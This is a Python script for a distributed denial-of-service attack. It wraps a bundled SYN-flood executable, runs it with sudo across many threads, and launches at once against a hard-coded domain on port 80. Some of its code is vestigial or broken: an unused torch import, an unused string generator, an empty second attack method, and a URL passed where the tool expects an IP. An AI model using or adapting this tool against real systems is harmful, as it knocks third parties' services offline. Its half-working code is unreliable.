import torch
import torch.nn as nn
import threading
from random_string_generator import RandomStringGenerator
import logging
import os
import subprocess
import sys
import platform
from urllib.parse import urlparse
import socket

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DDoSAttack:
    def __init__(
        self, target_url, target_port, num_connections, attack_type="asyncrone"
    ):
        self.target_url = target_url
        self.target_port = target_port
        self.num_connections = num_connections
        self.attack_type = attack_type
        self.threads = []
        self.model = RandomStringGenerator(100)

    def create_connection(self):
        for _ in range(self.num_connections):
            thread = threading.Thread(target=self.run_attack)
            self.threads.append(thread)
            thread.start()

    def run_attack(self):
        if self.attack_type == "asyncrone":
            self.aSYNcrone_attack()
        elif self.attack_type == "saphyra":
            self.saphyra_attack()
        else:
            logging.error(f"Unknown attack type: {self.attack_type}")

    def aSYNcrone_attack(self):
        if sys.platform == "darwin" and platform.machine() == "arm64":  # noqa
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM"
            )
        elif sys.platform == "darwin":  # noqa
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcronemac"
            )
        elif sys.platform == "linux":
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcrone"
            )
        else:
            logging.error(f"Unknown platform: {sys.platform}")
            return
        # aSYNcronemacARM <source port> <target IP> <target port> <threads number>
        parsed_url = urlparse(self.target_url)
        hostname = parsed_url.netloc
        socket.gethostbyname(hostname)
        command = [
            "sudo",
            "-S",
            path_to_executable,
            "80",
            self.target_url,
            str(self.target_port),
            str(self.num_connections),
        ]
        try:
            subprocess.run(command, check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Error while running aSYNcrone: {e}")
            return

    def saphyra_attack(self):
        os.path.join(os.path.dirname(__file__), "saphyra")

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


# Target parameters
target_url = "https://panthon.app"
target_port = 80
num_connections = 1

# Create and launch attack
attack = DDoSAttack(target_url, target_port, num_connections, "asyncrone")
attack.create_connection()
attack.wait_for_threads()
